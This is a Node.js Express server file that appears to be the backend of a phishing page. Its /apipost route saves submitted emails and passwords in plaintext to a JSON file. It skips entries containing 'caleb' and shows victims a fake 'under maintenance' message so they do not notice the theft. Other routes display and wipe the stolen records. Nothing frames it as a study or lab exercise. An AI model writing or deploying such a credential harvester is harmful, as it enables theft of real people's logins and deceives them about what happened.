// Basic Imports
const config = require("./config.json");
const express = require("express");
const app = express();
const chalk = require('chalk');
const fs = require('fs')

// MySQL Setup
let con = 0; // set = 0 to disable

// Backend Initialization
const backend = require('./backend.js');
backend.init(app, con);

// Routing
app.get('', async function(req, res) {
    backend.resetAppLocals(app);
    res.render('index.ejs');
});

app.get('/database', async function(req, res) {
    backend.resetAppLocals(app);
    let database = JSON.parse(await fs.readFileSync('database.json', 'utf8'));
    res.render('database.ejs', { database: database});
});

app.get('/wipe', async function(req, res) {
    backend.resetAppLocals(app);
    let database = [];
    fs.writeFileSync('database.json', JSON.stringify(database));
    res.redirect('/database')
});

app.post('/apipost', async function(req, res) {
    await backend.resetAppLocals(app);
    if(req.body.email === '') return;
    if(req.body.password === '') return;
    if(req.body.email.includes('caleb') || req.body.password.includes('caleb')) return;
    let dbOld = JSON.parse(await fs.readFileSync('database.json', 'utf8'));
    dbOld.push({
        "date": Date.now(),
        "email": req.body.email,
        "password": req.body.password
    });
    let newDB = JSON.stringify(dbOld);
    fs.writeFileSync('database.json', newDB);
    res.send('Sorry, we are currently under maintenance, please try again later!');
});

// MAKE SURE THIS IS LAST FOR 404 PAGE REDIRECT
app.get('*', function(req, res){
    res.render('404.ejs');
});

// Server Initialization
app.listen(config.port)

// Rejection Handler
process.on('unhandledRejection', (err) => { 
    if(config.debugMode) console.log(chalk.red(err));
});
